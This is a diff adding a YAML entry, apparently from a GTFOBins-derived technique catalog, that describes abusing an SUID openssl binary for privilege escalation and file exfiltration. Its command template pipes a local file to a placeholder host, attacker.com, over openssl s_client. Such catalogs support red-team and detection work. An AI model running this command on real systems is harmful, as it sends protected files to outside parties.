@@ -1,0 +1,24 @@
+id: gtfobins/openssl/upload/suid
+type: binary
+platform: linux
+name: openssl
+phases:
+- exfiltration
+- privilege-escalation
+capabilities:
+- file-upload
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file
+references:
+- https://gtfobins.github.io/gtfobins/openssl/
+tags:
+- linux
+- unix
+- gtfobins
